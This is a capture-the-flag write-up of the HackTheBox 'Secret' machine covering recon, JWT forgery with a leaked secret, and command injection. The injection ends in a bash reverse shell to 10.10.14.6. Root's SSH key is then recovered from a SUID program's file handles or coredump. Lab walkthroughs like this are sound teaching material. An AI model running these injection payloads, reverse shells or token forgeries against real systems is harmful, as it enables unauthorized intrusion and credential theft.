---
title: htb secret
author: Yuchao
date: 2021-10-30 00:00:00 +0000
categories: [sec]
tags: [htb, 0xdf, ippsec, express, nodejs, python, pyjwt, dotenv, jwt, nmap, feroxbuster, curl, git, privesc, c, coredump]
mermaid: true
---

## nmap
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120
nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120
```

## See 80, 3000 port run the same thing:
1. maybe 80 is a reverse proxy of 3000.
2. maybe one developer version, one production version.
3. some misconfiguration

## Directory discovery
```bash
feroxbuster -u http://10.10.11.120
```

## use API by document
```bash
# /api/user/register
curl -d '{"name":"0xdf0xdf","email":"dfdfdfdf@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
# /api/user/login
curl -d '{"email":"dfdfdfdf@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/login -H 'Content-Type: Application/json'
```
- -d data
- -X method
- -H header
- It supports these protocols: DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP,  LDAPS,  MQTT,  POP3,  POP3S, RTMP,  RTMPS,  RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP.
- after the request, got a JWT.

## nginx
- port 80 is same with port 3000. 3000 does not have NGINX.
- suspect NGINX is just there to proxy for Express.

## analysis the source
- nodejs express application

#### find Token generation
``` javascript
// Dotenv loads environment variables from a .env file into process.env
const dotenv = require('dotenv')
dotenv.config();
```
{: .nolineno file="index.js" }

``` javascript
// create jwt
const jwt = require("jsonwebtoken");
const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
res.header('auth-token', token).send(token);
const verified = jwt.verify(token, process.env.TOKEN_SECRET);
```
{: .nolineno file="/routes/auth.js" }

#### find git information
```bash
git log --oneline
git show 67d8da7
```
get the TOKEN_SECRET from git old version

#### find some api need "admin"`s token
- like ``` /api/priv ``` and ``` /api/logs ```

## Forge JWT
#### decode
``` pip3 install pyjwt ```
``` python
import jwt
token='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A'
secret='gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'
# decode
jwt.decode(token, secret, algorithms=["HS256"])
# result-> {'_id': '617825332c2bab0445c48462', 'name': '0xdf0xdf', 'email': 'dfdfdfdf@secret.com', 'iat': 1635263828}
```
#### Create Token
```python
j = jwt.decode(token, secret, algorithms=["HS256"])
j['name'] = 'theadmin'
jwt.encode(j, secret, algorithm="HS256")
# result-> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8
```

#### try to use
```bash
curl -s 'http://10.10.11.120/api/priv' -H "auth-token: {token}" | jq .
```

## Command Injection
```javascript
if (name == 'theadmin'){
    const getLogs = `git log --oneline ${file}`;
    exec(getLogs, (err , output) =>{
```
try to manituplate to -> ``` git log --oneline; [any command] ```
``` curl -s 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.6' -H "auth-token: {token}" | jq -r . ```
attacker machine -> ``` sudo tcpdump -ni tun0 icmp ```

Force to use G (Get) method.
- -d,  --data,  --data-binary  or --data-urlencode to be used in an HTTP GET request instead of the POST request.
```bash
curl -s -G 'http://10.10.11.120/api/logs' \
--data-urlencode 'file=/dev/null;id' \
-H "auth-token: {token}" \
| jq -r .
```

#### reverse shell
```bash
curl -s -G 'http://10.10.11.120/api/logs' \
--data-urlencode "file=>/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'" \
-H "auth-token: {token}" \
| jq -r .
```

attacker`s machine: ```  nc -lnvp 443 ```

## privesc

#### get information from coredump.

an suid program
```c
filecount(path, summary);
// source code of "count" program
// drop privs to limit file write
setuid(getuid());
// Enable coredump generation
prctl(PR_SET_DUMPABLE, 1);
printf("Save results a file? [y/N]: ");
res = getchar();
```
{file="code.c" }

- ```  ps auxww | grep count ``` find pid of the program
- background the program at getchar()
- find file handler in ``` /proc/[pid]/fd ```
- find "/root/.viminfo" as input file path can be readable
- as we can not access "/root", we can not ``` cat /root/.viminfo ```
- but we can read .viminfo from file handler
- We can get the SSH key from it.

#### another way, from Crash Dump

- Because Enabled coredump generation
- When a program crashes, the system stores the crash dump files in ``` /var/crash ```
- input ``` /root/.ssh/id_rsa ``` as path input
- ```  kill -l ``` list kill signals
- ```  kill -SIGSEGV {pid} ``` send a segmentation fault
- ``` /var/crash$ apport-unpack _opt_count.1000.crash /tmp/0xdf ``` decompress the dump into a given directory
- ``` strings -n 30 CoreDump ```
- then get the SSH key from it.
